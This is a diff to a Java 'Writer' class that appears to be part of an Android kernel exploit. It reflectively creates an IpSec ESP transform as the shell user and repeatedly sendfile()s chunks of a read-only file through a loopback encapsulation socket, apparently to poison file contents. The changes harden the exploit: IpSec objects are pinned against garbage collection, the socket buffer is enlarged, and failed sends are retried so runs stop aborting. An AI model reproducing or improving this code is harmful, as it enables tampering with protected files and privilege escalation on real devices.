@@ -33,6 +33,7 @@ public class Writer {
         Field x = o.getClass().getDeclaredField(f); x.setAccessible(true); return x.getInt(o);
     }
     static byte[] KEYMAT = new byte[20];
+    static Object[] KEEP;          // pins the IpSec token/socket/SA alive against mid-run GC teardown
     static Cipher AES;
     static int ks0(byte[] iv) throws Exception {
         byte[] ctr = new byte[16];
@@ -78,10 +79,15 @@ public class Writer {
         cfgC.getMethod("setEncapRemotePort", int.class).invoke(cfg, port);
         cfgC.getMethod("setAuthenticatedEncryption", C("android.net.IpSecAlgorithm")).invoke(cfg, alg);
         Object tr = call("createTransform", new Class<?>[]{cfgC, IB, String.class}, cfg, tok, "com.android.shell");
+        // Keep the IpSec objects strongly reachable for the WHOLE run. If tok/enc/spiR get GC'd mid-run
+        // (likely under post-boot memory pressure), IpSecService death-cleanup closes the encap socket +
+        // SA and every send then throws ECONNREFUSED -> the run aborts. Static ref pins them alive.
+        KEEP = new Object[]{ svc, tok, enc, spiR, alg, cfg, tr };
         System.out.println("[*] writer SA status=" + fi(tr, "status") + " spi=0x" + Integer.toHexString(spi)
                 + " port=" + port + " recs=" + nrec);
 
         FileDescriptor sk = Os.socket(OsConstants.AF_INET, OsConstants.SOCK_DGRAM, 0);
+        try { Os.setsockoptInt(sk, OsConstants.SOL_SOCKET, OsConstants.SO_SNDBUF, 4 << 20); } catch (Throwable t) {}
         Os.connect(sk, InetAddress.getByName("127.0.0.1"), port);
         FileDescriptor f = Os.open(path, OsConstants.O_RDONLY, 0);
 
@@ -102,10 +108,26 @@ public class Writer {
             byte[] hdr = new byte[16];
             hdr[0]=(byte)(spi>>>24); hdr[1]=(byte)(spi>>>16); hdr[2]=(byte)(spi>>>8); hdr[3]=(byte)spi;
             hdr[7]=1; System.arraycopy(iv,0,hdr,8,8);
-            Os.sendto(sk, hdr, 0, 16, MSG_MORE, null, 0);
-            Os.sendfile(sk, f, new Int64Ref(o), 17);
-            Os.sendto(sk, new byte[0], 0, 0, 0, null, 0);
-            Thread.sleep(3);
+            // Resilient send: on a busy system the loopback UDP buffer can transiently fill (EAGAIN).
+            // Retry THIS record inline (flushing any corked partial first) instead of aborting the whole
+            // run — so the orchestrator never has to restart the JVM+SA. 1ms pacing between records.
+            int tries = 0;
+            while (true) {
+                try {
+                    Os.sendto(sk, hdr, 0, 16, MSG_MORE, null, 0);
+                    Os.sendfile(sk, f, new Int64Ref(o), 17);
+                    Os.sendto(sk, new byte[0], 0, 0, 0, null, 0);
+                    break;
+                } catch (android.system.ErrnoException e) {
+                    // Transient loopback/ESP errors right after boot: EAGAIN/ENOBUFS (buffer full) and
+                    // ECONNREFUSED (a queued async ICMP error on the connected UDP socket). All clear on
+                    // retry, so retry THIS record inline (bounded) instead of aborting the whole run.
+                    try { Os.sendto(sk, new byte[0], 0, 0, 0, null, 0); } catch (Throwable ignore) {} // flush cork
+                    if (++tries > 500) throw e;
+                    Thread.sleep(2);
+                }
+            }
+            Thread.sleep(1);   // pacing; the on-device ctor poisons sleeplessly, so 1ms is ample
             wrote++;
         }
         r.close();
